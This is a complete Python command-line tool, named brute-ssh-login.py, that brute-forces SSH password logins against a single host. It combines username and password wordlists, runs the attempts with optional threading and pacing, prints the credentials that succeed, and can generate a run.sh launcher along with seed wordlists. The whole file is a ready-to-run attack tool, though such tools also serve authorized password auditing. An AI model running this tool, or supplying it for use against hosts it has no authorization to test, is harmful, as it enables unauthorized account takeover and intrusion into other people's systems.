#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# pip install paramiko

import argparse
import datetime
import json
import logging
import os
import shlex
import stat
import sys
from pathlib import Path
import time
import traceback
from concurrent.futures import CancelledError, ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from threading import Lock
from typing import Any

try:
    import paramiko
except ModuleNotFoundError:
    paramiko = None

DEBUG_MODE = False


def configure_paramiko_logging(debug: bool) -> None:
    """
    Silence paramiko transport-thread ERROR/traceback spam on expected failures.

    Paramiko logs SSHException (e.g. banner read after reset) in a worker thread
    even when the main thread already surfaces the same error; default runs only
    need CLI result lines.

    ```python
    configure_paramiko_logging(debug=False)

    return = None
    ```
    """
    logging.getLogger("paramiko").setLevel(logging.DEBUG if debug else logging.CRITICAL)


DEFAULT_INTERVAL_SECONDS = 0.0
DEFAULT_THREADS = 1
DEFAULT_TIMEOUT_SECONDS = 30.0
DEFAULT_PROGRESS_EVERY = 1000
DEFAULT_PORT = 22


class CLIStyle:
    """CLI tool unified style config."""

    COLORS = {
        "TITLE": 7,
        "SUB_TITLE": 2,
        "CONTENT": 3,
        "EXAMPLE": 7,
        "WARNING": 4,
        "ERROR": 2,
    }

    @staticmethod
    def color(text: str = "", color: int = COLORS["CONTENT"]) -> str:
        """Unified color processing function."""
        color_table = {
            0: "{}",
            1: "\033[1;30m{}\033[0m",
            2: "\033[1;31m{}\033[0m",
            3: "\033[1;32m{}\033[0m",
            4: "\033[1;33m{}\033[0m",
            5: "\033[1;34m{}\033[0m",
            6: "\033[1;35m{}\033[0m",
            7: "\033[1;36m{}\033[0m",
            8: "\033[1;37m{}\033[0m",
        }
        return color_table[color].format(text)


class ColoredArgumentParser(argparse.ArgumentParser):
    """Argument parser with colored output for option strings and sections."""

    def _format_action_invocation(self, action: argparse.Action) -> str:
        """Colorize option strings and metavar in help display."""
        if not action.option_strings:
            (metavar,) = self._metavar_formatter(action, action.dest)(1)
            return CLIStyle.color(str(metavar), CLIStyle.COLORS["SUB_TITLE"])

        parts: list[str] = []
        if action.nargs == 0:
            parts.extend(
                CLIStyle.color(option, CLIStyle.COLORS["SUB_TITLE"])
                for option in action.option_strings
            )
            return ", ".join(parts)

        args_string = self._format_args(action, action.dest.upper())
        colored_args = CLIStyle.color(args_string, CLIStyle.COLORS["CONTENT"])
        for option in action.option_strings:
            colored_option = CLIStyle.color(option, CLIStyle.COLORS["SUB_TITLE"])
            parts.append(f"{colored_option} {colored_args}")
        return ", ".join(parts)

    def format_help(self) -> str:
        """Build colorized help sections while preserving argparse structure."""
        formatter = self._get_formatter()
        if self.description:
            formatter.add_text(
                CLIStyle.color(self.description, CLIStyle.COLORS["TITLE"])
            )
        formatter.add_usage(self.usage, self._actions, self._mutually_exclusive_groups)
        formatter.add_text(
            CLIStyle.color("\nOptional Arguments:", CLIStyle.COLORS["TITLE"])
        )
        for action_group in self._action_groups:
            formatter.start_section(action_group.title)
            formatter.add_arguments(action_group._group_actions)
            formatter.end_section()
        if self.epilog:
            formatter.add_text(CLIStyle.color(self.epilog, CLIStyle.COLORS["CONTENT"]))
        return formatter.format_help()


def output_line(text: str = "", color: int = CLIStyle.COLORS["CONTENT"]) -> None:
    """
    Print one line with unified CLI style.

    ```python
    output_line("done", CLIStyle.COLORS["CONTENT"])

    return = None
    ```
    """
    print(CLIStyle.color(text, color))


def debug(message: str, *, enabled: bool) -> None:
    """
    Print debug messages when enabled.

    ```python
    debug("connect", enabled=True)

    return = None
    ```
    """
    if not enabled:
        return
    output_line(f"[debug] {message}", CLIStyle.COLORS["WARNING"])


def create_example_text(
    script_name: str,
    examples: list[tuple[str, str]],
    notes: list[str] | None = None,
) -> str:
    """Create a colorized example block for CLI epilog."""
    text = f"\n{CLIStyle.color('Examples:', CLIStyle.COLORS['SUB_TITLE'])}"
    for description, command in examples:
        text += f"\n  {CLIStyle.color(f'# {description}', CLIStyle.COLORS['EXAMPLE'])}"
        text += f"\n  {CLIStyle.color(f'{script_name} {command}', CLIStyle.COLORS['CONTENT'])}\n"
    if notes:
        text += f"\n{CLIStyle.color('Notes:', CLIStyle.COLORS['SUB_TITLE'])}"
        for note in notes:
            text += f"\n  {CLIStyle.color(f'- {note}', CLIStyle.COLORS['CONTENT'])}"
    return text


@dataclass(frozen=True)
class Account:
    """Username and password pair."""

    username: str
    password: str


@dataclass(frozen=True)
class TargetSpec:
    """SSH connection parameters."""

    host: str
    port: int
    auto_add_host_key: bool


@dataclass(frozen=True)
class TryResult:
    """Result of one SSH password login attempt."""

    requested_at: str
    username: str
    password: str
    ok: bool
    detail: str | None
    error: str | None


def load_text_file(file_path: str) -> str:
    """Load UTF-8 text file."""
    with open(file_path, "r", encoding="utf-8") as file_obj:
        return file_obj.read()


def read_nonempty_lines(file_path: str) -> list[str]:
    """Read non-empty lines from UTF-8 text file."""
    lines: list[str] = []
    with open(file_path, "r", encoding="utf-8") as file_obj:
        for line in file_obj:
            stripped = line.strip()
            if not stripped or stripped.startswith("#"):
                continue
            lines.append(stripped)
    return lines


def parse_json_object(value: str) -> dict[str, Any]:
    """Parse JSON object from string."""
    try:
        data = json.loads(value)
    except json.JSONDecodeError as error:
        raise ValueError(f"invalid JSON: {error.msg}") from error

    if not isinstance(data, dict):
        raise ValueError("JSON value must be an object")
    return data


def load_value_or_file(value: str, file_path: str, *, label: str) -> list[str]:
    """Load single value or list from file."""
    stripped_value = value.strip()
    stripped_file = file_path.strip()

    if stripped_value and stripped_file:
        raise ValueError(f"provide either --{label} or --{label}s, not both")
    if stripped_value:
        return [stripped_value]
    if stripped_file:
        return read_nonempty_lines(stripped_file)
    return []


def build_accounts_from_cli(
    *,
    user_value: str,
    users_file: str,
    password_value: str,
    passwords_file: str,
) -> tuple[list[Account], list[str], list[str]]:
    """Build account list and the user/password value lists used to build it."""
    users = load_value_or_file(user_value, users_file, label="user")
    passwords = load_value_or_file(password_value, passwords_file, label="password")

    has_user_input = bool(users)
    has_password_input = bool(passwords)

    if not has_user_input and not has_password_input:
        return [], [], []
    if not has_user_input or not has_password_input:
        raise ValueError(
            "batch mode requires both username and password input: "
            "provide --user/--users and --password/--passwords"
        )

    if len(users) == 1:
        accounts = [
            Account(username=users[0], password=password) for password in passwords
        ]
        return accounts, users, passwords
    if len(passwords) == 1:
        accounts = [Account(username=user, password=passwords[0]) for user in users]
        return accounts, users, passwords
    accounts = [
        Account(username=user, password=password)
        for user in users
        for password in passwords
    ]
    return accounts, users, passwords


def account_file_positions(
    account: Account,
    users: list[str],
    passwords: list[str],
    *,
    show_user_file: bool,
    show_password_file: bool,
) -> tuple[tuple[int, int] | None, tuple[int, int] | None]:
    """1-based (index, total) per file when that file mode is active."""
    user_pos: tuple[int, int] | None = None
    pass_pos: tuple[int, int] | None = None
    if show_user_file and users:
        try:
            user_pos = (users.index(account.username) + 1, len(users))
        except ValueError:
            user_pos = None
    if show_password_file and passwords:
        try:
            pass_pos = (passwords.index(account.password) + 1, len(passwords))
        except ValueError:
            pass_pos = None
    return user_pos, pass_pos


def parse_target_file(path: str) -> dict[str, Any]:
    """Load target JSON from file."""
    text = load_text_file(path).strip()
    if not text:
        raise ValueError("target file is empty")
    return parse_json_object(text)


def merge_target(
    args: argparse.Namespace,
    file_values: dict[str, Any] | None,
) -> TargetSpec:
    """Merge CLI args with optional target JSON file."""
    fv = file_values or {}

    host = (args.host or "").strip() if args.host else ""
    if not host and isinstance(fv.get("host"), str):
        host = fv["host"].strip()
    if not host:
        raise ValueError("host is required (--host or target file)")

    if args.port and args.port > 0:
        port = args.port
    elif "port" in fv and fv["port"] is not None:
        try:
            port = int(fv["port"])
        except (TypeError, ValueError) as error:
            raise ValueError("port in target file must be an integer") from error
    else:
        port = DEFAULT_PORT

    if port < 1 or port > 65535:
        raise ValueError("port must be between 1 and 65535")

    if args.strict_host_key:
        auto_add_host_key = False
    elif "auto_add_host_key" in fv and fv["auto_add_host_key"] is not None:
        auto_add_host_key = bool(fv["auto_add_host_key"])
    else:
        auto_add_host_key = True

    return TargetSpec(
        host=host,
        port=port,
        auto_add_host_key=auto_add_host_key,
    )


def try_ssh_login(
    target: TargetSpec,
    account: Account,
    *,
    timeout_seconds: float,
) -> TryResult:
    """Attempt one SSH password authentication and disconnect."""
    requested_at = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ssh = paramiko
    if ssh is None:
        return TryResult(
            requested_at=requested_at,
            username=account.username,
            password=account.password,
            ok=False,
            detail=None,
            error="paramiko is not installed",
        )

    client = ssh.SSHClient()
    if target.auto_add_host_key:
        client.set_missing_host_key_policy(ssh.AutoAddPolicy())
    else:
        client.set_missing_host_key_policy(ssh.RejectPolicy())
    try:
        client.connect(
            target.host,
            port=target.port,
            username=account.username,
            password=account.password,
            timeout=timeout_seconds,
            banner_timeout=timeout_seconds,
            auth_timeout=timeout_seconds,
            allow_agent=False,
            look_for_keys=False,
        )
        transport = client.get_transport()
        if transport is not None:
            transport.close()
        client.close()
        return TryResult(
            requested_at=requested_at,
            username=account.username,
            password=account.password,
            ok=True,
            detail="password authentication accepted",
            error=None,
        )
    except ssh.AuthenticationException as error:
        return TryResult(
            requested_at=requested_at,
            username=account.username,
            password=account.password,
            ok=False,
            detail=None,
            error=str(error) or "Authentication failed.",
        )
    except (ssh.SSHException, OSError) as error:
        return TryResult(
            requested_at=requested_at,
            username=account.username,
            password=account.password,
            ok=False,
            detail=None,
            error=str(error),
        )
    except Exception as error:
        return TryResult(
            requested_at=requested_at,
            username=account.username,
            password=account.password,
            ok=False,
            detail=None,
            error=str(error),
        )
    finally:
        try:
            client.close()
        except Exception:
            pass


def to_single_line_preview(result: TryResult, max_length: int = 120) -> str:
    """Convert message to a single-line preview."""
    if result.error is not None:
        preview = result.error
    elif result.detail is not None:
        preview = result.detail
    else:
        preview = ""

    normalized = " ".join(preview.split())
    if len(normalized) <= max_length:
        return normalized
    return normalized[: max_length - 3] + "..."


def print_run_summary(results: list[TryResult]) -> None:
    """Print aggregate counts and successful credentials after a run completes."""
    if not results:
        output_line("summary: no attempts", CLIStyle.COLORS["SUB_TITLE"])
        return
    successes = [r for r in results if r.ok]
    failed_n = len(results) - len(successes)
    output_line(
        f"summary: total={len(results)} success={len(successes)} failed={failed_n}",
        CLIStyle.COLORS["TITLE"],
    )
    for r in successes:
        output_line(
            f"  credential OK: user={r.username} password={r.password}",
            CLIStyle.COLORS["CONTENT"],
        )


def prompt_continue_after_success() -> bool:
    """
    Ask whether to keep trying after a successful login.

    ```python
    prompt_continue_after_success()

    return = False on EOF or negative answer
    ```
    """
    try:
        line = input(
            CLIStyle.color(
                "Success detected. Continue trying more passwords? [Y/n]: ",
                CLIStyle.COLORS["WARNING"],
            )
        )
    except EOFError:
        return False
    normalized = line.strip().lower()
    if normalized in ("", "y", "yes"):
        return True
    return False


def print_result_line(
    result: TryResult,
    *,
    user_pos: tuple[int, int] | None = None,
    pass_pos: tuple[int, int] | None = None,
) -> None:
    """Print one result line in real time."""
    preview = to_single_line_preview(result)
    status_text = "SUCCESS" if result.ok else "FAILED"
    status_color = CLIStyle.COLORS["CONTENT"] if result.ok else CLIStyle.COLORS["ERROR"]
    parts: list[str] = [
        CLIStyle.color(f"[{status_text}]", status_color),
        CLIStyle.color(f"time={result.requested_at}", CLIStyle.COLORS["SUB_TITLE"]),
    ]
    if user_pos is not None:
        u_i, u_n = user_pos
        parts.append(
            CLIStyle.color(f"user_pos={u_i}/{u_n}", CLIStyle.COLORS["SUB_TITLE"])
        )
    if pass_pos is not None:
        p_i, p_n = pass_pos
        parts.append(
            CLIStyle.color(f"pass_pos={p_i}/{p_n}", CLIStyle.COLORS["SUB_TITLE"])
        )
    parts.extend(
        [
            CLIStyle.color(f"user={result.username}", CLIStyle.COLORS["EXAMPLE"]),
            CLIStyle.color(f"password={result.password}", CLIStyle.COLORS["WARNING"]),
            CLIStyle.color("detail=", CLIStyle.COLORS["SUB_TITLE"])
            + CLIStyle.color(preview, status_color),
        ]
    )
    print(" ".join(parts))


def execute_tries(
    target: TargetSpec,
    accounts: list[Account],
    *,
    interval_seconds: float,
    threads: int,
    timeout_seconds: float,
    progress_every: int,
    users_list: list[str] | None = None,
    passwords_list: list[str] | None = None,
    show_user_file_indices: bool = False,
    show_password_file_indices: bool = False,
    pause_on_success: bool = False,
) -> list[TryResult]:
    """Run SSH login attempts with optional threading."""
    debug(
        f"host={target.host} port={target.port} "
        f"auto_add_host_key={target.auto_add_host_key}",
        enabled=DEBUG_MODE,
    )
    debug(f"threads={threads} interval_seconds={interval_seconds}", enabled=DEBUG_MODE)

    def run_one(account: Account) -> TryResult:
        return try_ssh_login(
            target,
            account,
            timeout_seconds=timeout_seconds,
        )

    def position_for(
        account: Account,
    ) -> tuple[tuple[int, int] | None, tuple[int, int] | None]:
        return account_file_positions(
            account,
            users_list or [],
            passwords_list or [],
            show_user_file=show_user_file_indices,
            show_password_file=show_password_file_indices,
        )

    total_items = len(accounts)
    progress_lock = Lock()
    completed_count = 0

    def mark_progress() -> None:
        nonlocal completed_count
        if progress_every <= 0:
            return
        with progress_lock:
            completed_count += 1
            should_report = (
                completed_count % progress_every == 0 or completed_count == total_items
            )
            if not should_report:
                return
            output_line(
                f"progress={completed_count}/{total_items}",
                CLIStyle.COLORS["WARNING"],
            )

    results: list[TryResult] = []
    if threads <= 1:
        for index, account in enumerate(accounts):
            if index > 0 and interval_seconds > 0:
                time.sleep(interval_seconds)
            result = run_one(account)
            u_pos, p_pos = position_for(account)
            print_result_line(result, user_pos=u_pos, pass_pos=p_pos)
            results.append(result)
            mark_progress()
            if pause_on_success and result.ok and not prompt_continue_after_success():
                break
        print_run_summary(results)
        return results

    def run_one_capture(acc: Account) -> tuple[Account, TryResult]:
        return acc, run_one(acc)

    remaining_indices = list(range(len(accounts)))
    while remaining_indices:
        executor = ThreadPoolExecutor(max_workers=threads)
        futures_map: dict[object, int] = {}
        try:
            for slot, idx in enumerate(remaining_indices):
                if slot > 0 and interval_seconds > 0:
                    time.sleep(interval_seconds)
                account = accounts[idx]
                futures_map[executor.submit(run_one_capture, account)] = idx

            wave_done: set[int] = set()
            stop_collecting = False
            stop_entire_run = False
            try:
                for fut in as_completed(futures_map):
                    idx = futures_map[fut]
                    try:
                        account, result = fut.result()
                    except CancelledError:
                        continue
                    wave_done.add(idx)
                    if stop_collecting:
                        continue
                    u_pos, p_pos = position_for(account)
                    print_result_line(result, user_pos=u_pos, pass_pos=p_pos)
                    results.append(result)
                    mark_progress()
                    if pause_on_success and result.ok:
                        executor.shutdown(wait=False, cancel_futures=True)
                        if not prompt_continue_after_success():
                            stop_entire_run = True
                        stop_collecting = True
            except KeyboardInterrupt:
                executor.shutdown(wait=False, cancel_futures=True)
                os._exit(130)
        finally:
            executor.shutdown(wait=True)

        if stop_entire_run:
            break
        remaining_indices = [i for i in remaining_indices if i not in wave_done]
        if not pause_on_success:
            break

    print_run_summary(results)
    return results


def summarize_exit(results: list[TryResult]) -> int:
    """Return process exit code from results (any failure -> 1)."""
    for result in results:
        if not result.ok:
            return 1
    return 0


INIT_SSH_TARGET_JSON = "ssh-target.json"
INIT_RUN_SH = "run.sh"
INIT_USERS_TXT = "users.txt"
INIT_PASSWORDS_TXT = "passwords.txt"


def run_init_ssh_workspace(
    cwd: Path,
    script_py: Path,
    *,
    force: bool,
) -> int:
    """
    Create run.sh, ssh-target.json, users.txt, and passwords.txt in cwd.

    Each default-named file is skipped if it already exists unless force is True.

    Returns 0 on success.
    """
    script_py = script_py.resolve()

    def write_one(name: str, content: str) -> None:
        path = cwd / name
        if path.exists() and not force:
            output_line(f"skip (exists): {path}", CLIStyle.COLORS["WARNING"])
            return
        path.write_text(content, encoding="utf-8")
        output_line(f"wrote: {path}", CLIStyle.COLORS["CONTENT"])
        if name == INIT_RUN_SH:
            mode = path.stat().st_mode
            path.chmod(mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)

    target_obj: dict[str, Any] = {
        "host": "127.0.0.1",
        "port": DEFAULT_PORT,
        "auto_add_host_key": True,
    }
    write_one(
        INIT_SSH_TARGET_JSON,
        json.dumps(target_obj, indent=2, ensure_ascii=False) + "\n",
    )
    write_one(
        INIT_USERS_TXT,
        "# One username per line (lines starting with # are ignored)\nadmin\n",
    )
    write_one(
        INIT_PASSWORDS_TXT,
        "# One password per line\nchangeme\n",
    )

    py_q = shlex.quote(str(script_py))
    run_body = (
        "#!/usr/bin/env bash\n"
        "set -euo pipefail\n"
        'HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"\n'
        "# Optional flags: uncomment lines in EXTRA. CLI --host/--port override ssh-target.json.\n"
        "EXTRA=()\n"
        "# EXTRA+=(--strict-host-key)\n"
        "# EXTRA+=(--pause-on-success)\n"
        "# EXTRA+=(--log)\n"
        f"exec python3 {py_q} \\\n"
        f'  --target-file "$HERE/{INIT_SSH_TARGET_JSON}" \\\n'
        '  --host "" \\\n'
        "  --port 0 \\\n"
        f"  --interval-seconds {DEFAULT_INTERVAL_SECONDS} \\\n"
        f"  --threads {DEFAULT_THREADS} \\\n"
        f"  --timeout-seconds {DEFAULT_TIMEOUT_SECONDS} \\\n"
        f"  --progress-every {DEFAULT_PROGRESS_EVERY} \\\n"
        f'  --users "$HERE/{INIT_USERS_TXT}" \\\n'
        f'  --passwords "$HERE/{INIT_PASSWORDS_TXT}" \\\n'
        '  "${EXTRA[@]}" \\\n'
        '  "$@"\n'
    )
    write_one(INIT_RUN_SH, run_body)
    output_line(
        "Init done. Edit ssh-target.json, run.sh (EXTRA), and wordlists.",
        CLIStyle.COLORS["TITLE"],
    )
    return 0


def build_parser() -> argparse.ArgumentParser:
    """Build CLI parser."""
    script_name = "python brute-ssh-login.py"
    examples = [
        (
            "Create run.sh and ssh-target.json in the current directory",
            "--init",
        ),
        (
            "Single attempt with target file",
            "--target-file ssh-target.json --user admin --password 123456",
        ),
        (
            "Batch mode with user/password lists",
            "--host 192.168.9.1 --port 22 --users users.txt --passwords passwords.txt",
        ),
        (
            "Reject unknown host keys (no silent trust)",
            "--host 10.0.0.1 --strict-host-key --user u --password p",
        ),
    ]
    notes = [
        "Use --init in the directory where you keep targets; run.sh uses the real path of this .py file.",
        "Provide either --user or --users, and either --password or --passwords.",
        "By default unknown host keys are trusted like answering Y (paramiko AutoAddPolicy).",
        "Use --strict-host-key to refuse connections until the host key is already known.",
        "Requires: pip install paramiko",
        "End of run prints a summary; --pause-on-success prompts after each success; "
        "with multiple threads, other pending tries are cancelled for that wave.",
    ]
    epilog = create_example_text(script_name, examples, notes=notes)

    parser = ColoredArgumentParser(
        description="SSH password login brute force / credential check against one host.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=epilog,
    )

    parser.add_argument(
        "--target-file",
        type=str,
        default="",
        help="JSON file with host, port, auto_add_host_key.",
    )
    parser.add_argument(
        "--host",
        type=str,
        default="",
        help="SSH host (overrides target file when set).",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=0,
        help=f"SSH port (default {DEFAULT_PORT} or from target file).",
    )

    parser.add_argument("--user", type=str, default="", help="Single username.")
    parser.add_argument(
        "--users", type=str, default="", help="Username file, one per line."
    )
    parser.add_argument("--password", type=str, default="", help="Single password.")
    parser.add_argument(
        "--passwords", type=str, default="", help="Password file, one per line."
    )

    parser.add_argument(
        "--strict-host-key",
        action="store_true",
        help=(
            "Reject unknown host keys (RejectPolicy). Default: auto-accept new keys "
            "(equivalent to confirming host key on first connect)."
        ),
    )

    parser.add_argument(
        "--interval-seconds",
        type=float,
        default=DEFAULT_INTERVAL_SECONDS,
        help="Seconds between submissions (stagger start in thread pool).",
    )
    parser.add_argument(
        "--threads", type=int, default=DEFAULT_THREADS, help="Concurrent thread count."
    )
    parser.add_argument(
        "--timeout-seconds",
        type=float,
        default=DEFAULT_TIMEOUT_SECONDS,
        help="Connect, banner, and auth timeout in seconds.",
    )
    parser.add_argument(
        "--progress-every",
        type=int,
        default=DEFAULT_PROGRESS_EVERY,
        help="Print progress every N completed attempts (default: 1000, use 0 to disable).",
    )
    parser.add_argument(
        "--pause-on-success",
        action="store_true",
        help=(
            "After a successful login, prompt to continue (Y) or stop (n). "
            "With threads>1, pending tries are cancelled when the first success is observed."
        ),
    )
    parser.add_argument(
        "--init",
        action="store_true",
        help=(
            f"Create {INIT_RUN_SH}, {INIT_SSH_TARGET_JSON}, {INIT_USERS_TXT}, "
            f"{INIT_PASSWORDS_TXT} in the current working directory "
            "(skip each file that already exists unless --init-force)."
        ),
    )
    parser.add_argument(
        "--init-force",
        action="store_true",
        help="With --init, overwrite files that already exist.",
    )
    parser.add_argument("--log", action="store_true", help="Enable debug output.")

    return parser


def main() -> int:
    """Main program logic."""
    parser = build_parser()
    args = parser.parse_args()

    global DEBUG_MODE
    DEBUG_MODE = bool(args.log)

    if args.init:
        return run_init_ssh_workspace(
            Path.cwd(),
            Path(__file__).resolve(),
            force=bool(args.init_force),
        )

    if paramiko is None:
        output_line(
            "Error: paramiko is required. Install with: pip install paramiko",
            CLIStyle.COLORS["ERROR"],
        )
        return 1

    configure_paramiko_logging(DEBUG_MODE)

    try:
        file_values: dict[str, Any] | None = None
        if args.target_file.strip():
            file_values = parse_target_file(args.target_file.strip())

        target = merge_target(args, file_values)

        accounts, users_list, passwords_list = build_accounts_from_cli(
            user_value=args.user,
            users_file=args.users,
            password_value=args.password,
            passwords_file=args.passwords,
        )
        if not accounts:
            raise ValueError(
                "provide --user/--users and --password/--passwords for batch mode"
            )

        show_user_file_indices = bool(args.users.strip())
        show_password_file_indices = bool(args.passwords.strip())
        results = execute_tries(
            target,
            accounts,
            interval_seconds=args.interval_seconds,
            threads=args.threads,
            timeout_seconds=args.timeout_seconds,
            progress_every=args.progress_every,
            users_list=users_list,
            passwords_list=passwords_list,
            show_user_file_indices=show_user_file_indices,
            show_password_file_indices=show_password_file_indices,
            pause_on_success=bool(args.pause_on_success),
        )
        return summarize_exit(results)
    except FileNotFoundError as error:
        missing_file = error.filename if error.filename else "unknown"
        output_line(f"Error: File '{missing_file}' not found", CLIStyle.COLORS["ERROR"])
        return 1
    except ValueError as error:
        output_line(f"Error: {str(error)}", CLIStyle.COLORS["ERROR"])
        return 2
    except Exception as error:
        if DEBUG_MODE:
            traceback.print_exc()
        output_line(f"Error: {str(error)}", CLIStyle.COLORS["ERROR"])
        return 1


if __name__ == "__main__":
    sys.exit(main())
